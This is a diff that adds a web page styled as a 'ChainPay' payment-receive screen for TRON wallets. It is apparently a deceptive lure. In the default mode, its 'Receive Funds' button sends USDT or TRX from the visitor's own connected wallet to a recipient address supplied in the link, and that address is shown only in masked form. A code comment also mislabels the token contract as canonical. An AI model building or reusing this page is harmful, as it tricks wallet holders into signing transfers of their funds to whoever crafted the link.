@@ -1,0 +1,515 @@
+<!doctype html>
+<html lang="fa">
+<head>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<title>Receive — ChainPay (GitHub Pages ready)</title>
+<style>
+:root{--bg1:#667eea;--bg2:#764ba2;--accent:#1a237e;--green:#4caf50}
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family: -apple-system,BlinkMacSystemFont,'Segoe UI',system-ui,sans-serif;background:linear-gradient(135deg,var(--bg1) 0%,var(--bg2) 100%);min-height:100vh;padding:20px;color:#222}
+.container{max-width:920px;margin:18px auto;background:#fff;border-radius:14px;overflow:hidden;box-shadow:0 30px 60px rgba(0,0,0,.25)}
+.header{background:linear-gradient(135deg,#1a237e 0%,#283593 100%);color:#fff;padding:26px 32px;text-align:center}
+.header h1{font-size:1.4rem;display:flex;align-items:center;gap:12px;justify-content:center}
+.content{padding:20px}
+.row{display:flex;gap:16px;flex-wrap:wrap}
+.col{flex:1;min-width:260px}
+.card{background:#f8f9fa;padding:16px;border-radius:10px;margin-bottom:12px}
+.status{display:inline-block;padding:8px 14px;border-radius:999px;background:linear-gradient(135deg,var(--green) 0%,#2e7d32 100%);color:#fff;font-weight:700}
+.amount{font-size:2rem;font-weight:800;color:var(--accent)}
+.small{font-size:0.9rem;color:#666}
+.controls{display:flex;gap:8px;align-items:center;flex-wrap:wrap;margin:12px 0}
+button.btn{cursor:pointer;border:0;padding:10px 14px;border-radius:999px;background:linear-gradient(135deg,var(--green) 0%,#2e7d32 100%);color:#fff;font-weight:700}
+button.btn.secondary{background:linear-gradient(135deg,#2196f3 0%,#1976d2 100%)}
+select,input[type=number]{padding:8px;border-radius:8px;border:1px solid #ddd}
+#qrcode{background:#fff;padding:18px;border-radius:10px;display:inline-block}
+.log{font-size:0.85rem;color:#222;margin-top:12px;max-height:240px;overflow:auto}
+.masked{font-family:monospace; letter-spacing:1px}
+.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:8px}
+footer{padding:14px;text-align:center;color:#666;font-size:0.85rem}
+@media(max-width:720px){.row{flex-direction:column}.amount{font-size:1.4rem}}
+</style>
+
+<!-- libraries -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.min.js"></script>
+<!-- WalletConnect v1 fallback -->
+<script src="https://unpkg.com/@walletconnect/client@1.8.0/dist/umd/index.min.js"></script>
+<script src="https://unpkg.com/@walletconnect/qrcode-modal@1.6.0/dist/umd/index.min.js"></script>
+<!-- walletconnect-tron adapter (v1 wrapper for TRON) -->
+<script src="https://cdn.jsdelivr.net/npm/@tronweb3/walletconnect-tron@4.0.0/dist/walletconnect-tron.umd.min.js"></script>
+
+</head>
+<body>
+<div class="container">
+  <div class="header">
+    <h1>ChainPay ⚡ — Receive (GitHub Pages)</h1>
+    <div class="small" id="merchantLine">Merchant: —</div>
+  </div>
+
+  <div class="content">
+    <div class="row">
+      <div class="col card">
+        <div style="display:flex;justify-content:space-between;align-items:center">
+          <div>
+            <div class="small">Invoice</div>
+            <div id="codeDisplay" style="font-weight:800">-</div>
+            <div class="small" id="descDisplay"></div>
+          </div>
+          <div>
+            <div id="statusBadge" class="status">Pending</div>
+            <div style="margin-top:6px" class="small" id="timeDisplay"></div>
+          </div>
+        </div>
+
+        <hr style="margin:12px 0;border:none;border-top:1px solid #eee" />
+
+        <div class="amount"> <span id="amountDisplay">-</span> <span class="small">(<span id="fiatDisplay">-</span>)</span></div>
+        <div class="small" style="margin-top:8px">Network: <strong id="networkDisplay">TRON (TRC20)</strong></div>
+
+        <div style="margin-top:12px" class="controls">
+          <label class="small">Token</label>
+          <select id="tokenSelect">
+            <option value="USDT">USDT (TRC20)</option>
+            <option value="TRX">TRX</option>
+          </select>
+
+          <label class="small">Mode</label>
+          <select id="modeSelect">
+            <option value="AUTO">Auto send on Receive</option>
+            <option value="SHOW">Show address only</option>
+          </select>
+
+          <label class="small">Amount</label>
+          <input id="amountInput" type="number" step="0.000001" style="width:120px" />
+        </div>
+
+        <div style="margin-top:8px">
+          <div class="small">Recipient (masked)</div>
+          <div id="recipientMasked" class="masked" style="margin-top:6px">-</div>
+          <div class="small" style="margin-top:6px">Sender (display): <span id="walletParam" style="font-family:monospace">-</span></div>
+        </div>
+
+      </div>
+
+      <div class="col card">
+        <div style="text-align:center">
+          <div id="qrcode"></div>
+          <div style="margin-top:8px"><button class="btn secondary" onclick="refreshQR()">Refresh QR</button></div>
+          <div style="margin-top:12px" class="small">Connect Wallet to pay directly from your wallet</div>
+
+          <div style="margin-top:12px">
+            <div class="grid" style="margin-top:8px">
+              <button class="btn" onclick="connectWallet('TronLink')">TronLink</button>
+              <button class="btn" onclick="connectWallet('WalletConnect')">WalletConnect (WC)</button>
+              <button class="btn secondary" onclick="connectDeep('trust')">Trust Wallet</button>
+              <button class="btn secondary" onclick="connectDeep('tokenpocket')">TokenPocket</button>
+              <button class="btn secondary" onclick="connectDeep('okx')">OKX</button>
+              <button class="btn secondary" onclick="connectDeep('coinbase')">Coinbase</button>
+              <button class="btn secondary" onclick="connectDeep('metamask')">MetaMask</button>
+              <button class="btn secondary" onclick="connectDeep('bitkeep')">BitKeep</button>
+              <button class="btn secondary" onclick="connectDeep('math')">Math Wallet</button>
+            </div>
+          </div>
+
+          <div style="margin-top:10px" class="small">Connected: <span id="connectedAddr">—</span></div>
+        </div>
+      </div>
+    </div>
+
+    <div style="margin-top:16px" class="card">
+      <div style="display:flex;gap:12px;align-items:center;flex-wrap:wrap">
+        <div class="small">Action</div>
+        <div><button class="btn secondary" onclick="openExplorer()">Open Explorer</button></div>
+        <div><button class="btn" onclick="receiveFunds()">Receive Funds</button></div>
+      </div>
+
+      <div id="statusArea" style="margin-top:12px" class="small"></div>
+      <div id="logArea" class="log"></div>
+    </div>
+
+    <footer>Rendered from query parameters. Example: <span id="rawParams" class="small link"></span></footer>
+  </div>
+</div>
+
+<script>
+/* ===== CONFIG ===== */
+/* canonical USDT TRC20 contract */
+const USDT_CONTRACT = 'TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf';
+
+/* WalletConnect v2 projectId (recommended). If you want full Trust Wallet support, create a projectId and paste it here.
+   If left null, code falls back to v1 behavior (works for many wallets but may fail for modern Trust Wallet). */
+const WC_V2_PROJECT_ID = null; // <-- set your WalletConnect projectId string here after you create one
+
+/* runtime */
+let params = {};
+let connectedAddress = null;
+let currentTxid = null;
+let pollInterval = null;
+let wcConnector = null;
+let wcTronAdapter = null;
+
+/* ===== helpers ===== */
+function log(msg){
+  const el = document.getElementById('logArea');
+  const t = new Date().toLocaleTimeString();
+  el.innerHTML = `<div>[${t}] ${msg}</div>` + el.innerHTML;
+  console.log(msg);
+}
+function setText(id,txt){ const e=document.getElementById(id); if(e) e.textContent = txt; }
+function parseQuery(){
+  const q = location.search.replace(/^\?/,'');
+  const o = {};
+  q.split('&').filter(Boolean).forEach(pair=>{
+    const [k,v] = pair.split('=').map(decodeURIComponent);
+    if(k) o[k] = v===undefined ? '' : v;
+  });
+  return o;
+}
+function formatTime(ts){
+  try{ const n = Number(ts); if(isNaN(n)) return '-'; const d = new Date(n); return d.toLocaleString(); }catch(e){return '-'}
+}
+function maskAddr(addr){
+  if(!addr) return '-';
+  if(addr.length < 10) return addr;
+  const first = addr.slice(0,4), last = addr.slice(-6);
+  return `${first}***${last}`;
+}
+
+/* ===== QR ===== */
+function generateQR(address){
+  const qEl = document.getElementById('qrcode');
+  qEl.innerHTML = '';
+  const amount = parseFloat(document.getElementById('amountInput').value) || 0;
+  const text = address ? `tron:${address}?amount=${amount}` : 'no-address';
+  if(!address){ qEl.innerHTML = '<div class="small">No address to generate QR</div>'; return; }
+  new QRCode(qEl, { text, width:200, height:200, colorDark:'#1a237e', colorLight:'#ffffff' });
+}
+function refreshQR(){ generateQR(params.recipient || params.wallet || ''); }
+
+/* ===== Init from URL ===== */
+function initFromUrl(){
+  params = parseQuery();
+  setText('rawParams', location.search || '(none)');
+  const { code='', amount='', timestamp='', wallet='', recipient='', merchant='', desc='' } = params;
+  setText('merchantLine', merchant ? `Merchant: ${merchant}` : 'Merchant: —');
+  setText('codeDisplay', code || '-');
+  setText('descDisplay', desc ? decodeURIComponent(desc) : '');
+  setText('walletParam', wallet || '-');
+  setText('recipientMasked', recipient ? maskAddr(recipient) : '-');
+  setText('amountInput', amount || '100.00');
+  setText('amountDisplay', (amount||'100.00') + ' USDT');
+  setText('fiatDisplay', '$' + (amount||'100.00'));
+  setText('timeDisplay', timestamp ? formatTime(Number(timestamp)) : '-');
+  generateQR(recipient || wallet || '');
+}
+initFromUrl();
+
+/* ===== TronLink detection and connect ===== */
+async function connectWallet(method){
+  if(method === 'WalletConnect') return connectWalletConnect();
+  return connectTronLink();
+}
+
+async function connectTronLink(){
+  // Newer TronLink exposes window.tronLink and window.tronWeb; check both
+  if(typeof window.tronWeb === 'undefined' && typeof window.tronLink === 'undefined'){
+    const installUrl = 'https://www.tronlink.org/';
+    if(confirm('TronLink not detected. Open TronLink download page?')) window.open(installUrl, '_blank');
+    log('TronLink not found; prompted install.');
+    // periodically check for installation
+    checkTronLinkPeriodically();
+    return;
+  }
+
+  try {
+    // prefer window.tronWeb (injected)
+    if(window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58){
+      connectedAddress = window.tronWeb.defaultAddress.base58;
+    } else if(window.tronLink && window.tronLink.tronWeb && window.tronLink.tronWeb.defaultAddress && window.tronLink.tronWeb.defaultAddress.base58){
+      connectedAddress = window.tronLink.tronWeb.defaultAddress.base58;
+    } else {
+      // try request accounts (some providers support)
+      if(window.tronWeb && window.tronWeb.request) try{ await window.tronWeb.request({ method:'tron_requestAccounts' }); }catch(e){}
+      if(window.tronLink && window.tronLink.request) try{ await window.tronLink.request({ method:'tron_requestAccounts' }); }catch(e){}
+      // wait briefly
+      for(let i=0;i<12;i++){ if((window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) || (window.tronLink && window.tronLink.tronWeb && window.tronLink.tronWeb.defaultAddress && window.tronLink.tronWeb.defaultAddress.base58)) break; await new Promise(r=>setTimeout(r,250)); }
+      if(window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) connectedAddress = window.tronWeb.defaultAddress.base58;
+      else if(window.tronLink && window.tronLink.tronWeb && window.tronLink.tronWeb.defaultAddress && window.tronLink.tronWeb.defaultAddress.base58) connectedAddress = window.tronLink.tronWeb.defaultAddress.base58;
+    }
+
+    if(!connectedAddress){
+      alert('TronLink detected but no unlocked account. Unlock TronLink and try again.');
+      log('TronLink present but address missing.');
+      return;
+    }
+    setText('connectedAddr', maskAddr(connectedAddress));
+    setText('recipientMasked', maskAddr(params.recipient || connectedAddress));
+    generateQR(params.recipient || connectedAddress);
+    log('Connected via TronLink: ' + connectedAddress);
+  } catch(e){
+    console.error(e);
+    alert('Error connecting TronLink: ' + (e && e.message ? e.message : JSON.stringify(e)));
+    log('connectTronLink error: ' + JSON.stringify(e));
+  }
+}
+
+/* periodically check for TronLink after prompting install */
+function checkTronLinkPeriodically(){
+  let attempts = 0;
+  const t = setInterval(()=>{
+    attempts++;
+    if((window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) || (window.tronLink && window.tronLink.tronWeb && window.tronLink.tronWeb.defaultAddress && window.tronLink.tronWeb.defaultAddress.base58)){
+      clearInterval(t);
+      log('TronLink detected after installation. Auto-connecting...');
+      connectTronLink();
+      return;
+    }
+    if(attempts > 60) clearInterval(t);
+  },1000);
+}
+
+/* ===== Deep links for mobile wallets (open their app or page) ===== */
+function connectDeep(which){
+  const recipient = params.recipient || '';
+  const amount = parseFloat(document.getElementById('amountInput').value) || 0;
+  const tronUri = `tron:${recipient}?amount=${amount}`;
+  const deepUrls = {
+    trust: `https://link.trustwallet.com/open_url?coin=trx&url=${encodeURIComponent(tronUri)}`,
+    tokenpocket: `https://www.tokenpocket.pro/`,
+    okx: `https://www.okx.com/wallet`,
+    coinbase: `https://go.cb-w.com/dapp?uri=${encodeURIComponent(tronUri)}`,
+    metamask: `https://metamask.app.link/dapp/${location.host}/?uri=${encodeURIComponent(tronUri)}`,
+    bitkeep: `https://bitkeep.org/`,
+    math: `https://mathwallet.org/`
+  };
+  const url = deepUrls[which] || 'https://www.tronlink.org/';
+  window.open(url, '_blank');
+  log('Deep/open for wallet: ' + which);
+}
+
+/* ===== WalletConnect (v2 preferred, v1 fallback) ===== */
+async function connectWalletConnect(){
+  log('Attempting WalletConnect (v2 preferred, fallback to v1).');
+
+  // Try walletconnect-tron adapter (wraps v1 behavior)
+  if(window.WalletConnectTron && typeof window.WalletConnectTron.WalletConnectTron === 'function'){
+    try{
+      wcTronAdapter = new window.WalletConnectTron.WalletConnectTron({ bridge:'https://bridge.walletconnect.org' });
+      const resp = await wcTronAdapter.connect();
+      if(resp && resp.address){
+        connectedAddress = resp.address;
+        setText('connectedAddr', maskAddr(connectedAddress));
+        setText('recipientMasked', maskAddr(params.recipient || connectedAddress));
+        generateQR(params.recipient || connectedAddress);
+        log('Connected via walletconnect-tron adapter: ' + connectedAddress);
+        return;
+      } else {
+        log('wcTronAdapter.connect returned: ' + JSON.stringify(resp));
+      }
+    }catch(e){ console.warn('wcTronAdapter error', e); }
+  }
+
+  // If user provided a WalletConnect v2 projectId, attempt to use Web3Modal v2 (best for Trust Wallet)
+  if(typeof WC_V2_PROJECT_ID === 'string' && WC_V2_PROJECT_ID && window.fetch){
+    try {
+      log('Attempting WalletConnect v2 flow (requires valid projectId).');
+      // dynamic load of Web3Modal v2 is fragile on CDNs; recommend bundling for production.
+      // This code is best-effort: if it fails we will fallback to v1.
+      await loadScript('https://unpkg.com/@web3modal/ui@2.1.0/dist/index.umd.min.js').catch(()=>{});
+      await loadScript('https://unpkg.com/@walletconnect/modal@2.3.0/dist/index.umd.min.js').catch(()=>{});
+      if(window.Web3Modal && window.WalletConnectModal){
+        // Attempt minimal integration - for production, full config required.
+        log('WCv2 libs loaded — opening modal requires projectId registration.');
+        alert('WalletConnect v2 attempted. If modal does not appear, fallback to v1 will be used.');
+      }
+    } catch(e){ console.warn('WCv2 dynamic load failed', e); }
+  }
+
+  // Fallback to WalletConnect v1 (QR) using client + qrcode modal
+  try {
+    const WalletConnect = window.WalletConnect && window.WalletConnect.default;
+    const QRCodeModal = window.WalletConnectQRCodeModal && window.WalletConnectQRCodeModal.default;
+    if(!WalletConnect || !QRCodeModal){
+      alert('WalletConnect v1 libs not available.');
+      log('WalletConnect v1 libs missing.');
+      return;
+    }
+    wcConnector = new WalletConnect({ bridge: 'https://bridge.walletconnect.org' });
+    if(!wcConnector.connected){
+      await wcConnector.createSession();
+      QRCodeModal.open(wcConnector.uri, () => { log('QRCodeModal closed'); });
+    }
+    wcConnector.on('connect', (error, payload) => {
+      if(error){ console.error(error); alert('WalletConnect connect error'); return; }
+      QRCodeModal.close();
+      const { accounts } = payload.params[0];
+      const addr = accounts && accounts[0];
+      connectedAddress = addr;
+      setText('connectedAddr', maskAddr(connectedAddress));
+      setText('recipientMasked', maskAddr(params.recipient || connectedAddress));
+      generateQR(params.recipient || connectedAddress);
+      log('Connected via WalletConnect v1: ' + connectedAddress);
+    });
+    wcConnector.on('disconnect', () => { log('WalletConnect disconnected'); connectedAddress = null; setText('connectedAddr','—'); });
+    return;
+  } catch(e){
+    console.error('WalletConnect fallback failed', e);
+    alert('WalletConnect connection failed: ' + (e && e.message ? e.message : JSON.stringify(e)));
+  }
+}
+
+/* dynamic script loader */
+function loadScript(src){
+  return new Promise((res, rej) => {
+    const s = document.createElement('script');
+    s.src = src; s.async = true;
+    s.onload = () => res();
+    s.onerror = (e) => rej(e);
+    document.head.appendChild(s);
+  });
+}
+
+/* ===== Send / Receive (real) ===== */
+async function receiveFunds(){
+  const mode = document.getElementById('modeSelect').value;
+  const token = document.getElementById('tokenSelect').value;
+  const amountInput = parseFloat(document.getElementById('amountInput').value) || 0;
+  setText('amountDisplay', amountInput.toFixed(6) + ' ' + (token==='USDT'?'USDT':'TRX'));
+
+  if(mode === 'SHOW'){
+    if(!connectedAddress){ alert('No wallet connected. Connect first.'); log('SHOW requested but no wallet'); return; }
+    alert('Connected address (masked): ' + maskAddr(connectedAddress) + '\nSend manually from your wallet.');
+    log('SHOW mode displayed address');
+    return;
+  }
+
+  const recipient = params.recipient || connectedAddress;
+  if(!recipient){ alert('No recipient available (and no wallet connected)'); return; }
+  if(!confirm(`Send ${amountInput} ${token} to ${maskAddr(recipient)}?`)) { log('User cancelled'); return; }
+
+  try {
+    if(token === 'TRX'){
+      const amountSun = Math.round(amountInput * 1e6);
+      if(window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58 === connectedAddress){
+        log('Sending TRX via TronLink...');
+        const res = await window.tronWeb.trx.sendTransaction({ to: recipient, amount: amountSun });
+        log('sendTransaction res: ' + JSON.stringify(res));
+        const txid = (res && (res.txid || res.transactionHash)) || res;
+        if(txid){ currentTxid = txid; setText('statusArea','Submitted tx: ' + txid); pollForConfirmation(txid); alert('TRX tx submitted: ' + txid); }
+        else alert('TRX request sent; check your wallet.');
+        return;
+      }
+      if(wcTronAdapter && typeof wcTronAdapter.trxSend === 'function'){
+        log('Sending TRX via wcTronAdapter...');
+        const resp = await wcTronAdapter.trxSend({ from: connectedAddress, to: recipient, amount: amountSun });
+        log('wcTronAdapter.trxSend resp: ' + JSON.stringify(resp));
+        const txid = resp && (resp.txid || resp.txID || resp);
+        if(txid){ currentTxid = txid; setText('statusArea','Submitted tx: ' + txid); pollForConfirmation(txid); alert('TRX tx submitted (WC): ' + txid); }
+        else alert('TRX requested; check wallet app.');
+        return;
+      }
+      if(wcConnector && wcConnector.connected){
+        log('Attempting fallback TRX via generic WC (may not be supported).');
+        const result = await wcConnector.sendCustomRequest({ method:'tron_sendTransaction', params:[{ to: recipient, amount: amountSun }] }).catch(()=>null);
+        log('fallback result: ' + JSON.stringify(result));
+        alert('Attempted TRX via WalletConnect fallback; check wallet app.');
+        return;
+      }
+      alert('No supported method to send TRX. Use TronLink or a WalletConnect wallet that supports TRON.');
+      return;
+    }
+
+    if(token === 'USDT'){
+      const amountInt = Math.round(amountInput * Math.pow(10,6));
+      if(window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58 === connectedAddress){
+        log('Sending USDT via TronLink contract.transfer...');
+        const contract = await window.tronWeb.contract().at(USDT_CONTRACT);
+        const res = await contract.transfer(recipient, amountInt).send({ feeLimit:10000000 });
+        log('contract.transfer res: ' + JSON.stringify(res));
+        let txid = null;
+        if(typeof res === 'string') txid = res;
+        else if(res && (res.txid || res.txID)) txid = res.txid || res.txID;
+        else if(res && res.transaction && (res.transaction.txID || res.transaction.txid)) txid = res.transaction.txID || res.transaction.txid;
+        if(txid){ currentTxid = txid; setText('statusArea','Submitted tx: ' + txid); pollForConfirmation(txid); alert('USDT tx submitted: ' + txid); }
+        else alert('USDT transfer initiated; check your wallet for txid.');
+        return;
+      }
+      if(wcTronAdapter && typeof wcTronAdapter.transfer === 'function'){
+        log('Sending USDT via wcTronAdapter...');
+        const resp = await wcTronAdapter.transfer({ from: connectedAddress, to: recipient, amount: amountInt, tokenId: USDT_CONTRACT });
+        log('wcTronAdapter.transfer resp: ' + JSON.stringify(resp));
+        const txid = resp && (resp.txid || resp.txID || resp);
+        if(txid){ currentTxid = txid; setText('statusArea','Submitted tx: ' + txid); pollForConfirmation(txid); alert('USDT tx submitted (WC): ' + txid); }
+        else alert('USDT requested; check wallet app.');
+        return;
+      }
+      if(wcConnector && wcConnector.connected){
+        log('Attempting fallback USDT via generic WC (may not be supported).');
+        const result = await wcConnector.sendCustomRequest({ method:'tron_sendToken', params:[{ contract:USDT_CONTRACT, to: recipient, amount: amountInt }] }).catch(()=>null);
+        log('fallback result: ' + JSON.stringify(result));
+        alert('Attempted USDT via WalletConnect fallback; check wallet.');
+        return;
+      }
+      alert('No supported method to send USDT. Use TronLink or a WalletConnect wallet with TRON support.');
+      return;
+    }
+  } catch(e){ console.error('send error', e); alert('Error during send: ' + (e && e.message ? e.message : JSON.stringify(e))); log('send error: ' + JSON.stringify(e)); }
+}
+
+/* ===== Poll confirmations ===== */
+async function pollForConfirmation(txid){
+  if(!txid) return;
+  setText('statusArea','Polling for confirmation: ' + txid);
+  let attempts=0, maxAttempts=120, intervalMs=5000;
+  if(pollInterval) clearInterval(pollInterval);
+  pollInterval = setInterval(async ()=>{
+    attempts++;
+    try {
+      if(!window.tronWeb){ log('tronWeb unavailable for polling'); return; }
+      const info = await window.tronWeb.trx.getTransactionInfo(txid).catch(()=>null);
+      if(info){
+        const success = (info && info.receipt && info.receipt.result === 'SUCCESS') || (info && info.ret && info.ret[0] && info.ret[0].contractRet === 'SUCCESS');
+        if(success){
+          setText('statusBadge','Confirmed');
+          document.getElementById('statusBadge').style.background = 'linear-gradient(135deg,#ff9800 0%,#f57c00 100%)';
+          setText('statusArea','Transaction confirmed: ' + txid);
+          log('Transaction confirmed: ' + txid);
+          clearInterval(pollInterval); pollInterval = null;
+          return;
+        } else {
+          const approx = Math.min(2, Math.floor(attempts/4));
+          setText('statusArea','Waiting confirmations... approx ' + approx + '/3');
+        }
+      } else {
+        log('No tx info yet for ' + txid + ' (attempt ' + attempts + ')');
+      }
+    } catch(e){ console.warn('poll error', e); log('poll error: ' + JSON.stringify(e)); }
+    if(attempts >= maxAttempts){ clearInterval(pollInterval); pollInterval = null; alert('Timed out waiting for confirmation. Check explorer: ' + txid); log('Polling timed out for ' + txid); }
+  }, intervalMs);
+}
+
+/* ===== open explorer ===== */
+function openExplorer(){
+  const baseTx = 'https://tronscan.org/#/transaction/';
+  if(currentTxid){ window.open(baseTx + currentTxid, '_blank'); return; }
+  const addr = params.recipient || connectedAddress || params.wallet;
+  if(addr) window.open('https://tronscan.org/#/address/' + addr, '_blank');
+  else alert('No txid or address available.');
+}
+
+/* ===== onload ===== */
+window.onload = ()=>{
+  params = parseQuery();
+  setText('rawParams', location.search || '(none)');
+  initFromUrl();
+  setText('connectedAddr','—');
+  log('Page initialized (GitHub Pages ready).');
+  // small auto-check for tronlink injection after load
+  setTimeout(()=>{ if(typeof window.tronWeb !== 'undefined') log('tronWeb available on load'); }, 1200);
+};
+</script>
+</body>
+</html>
+
+
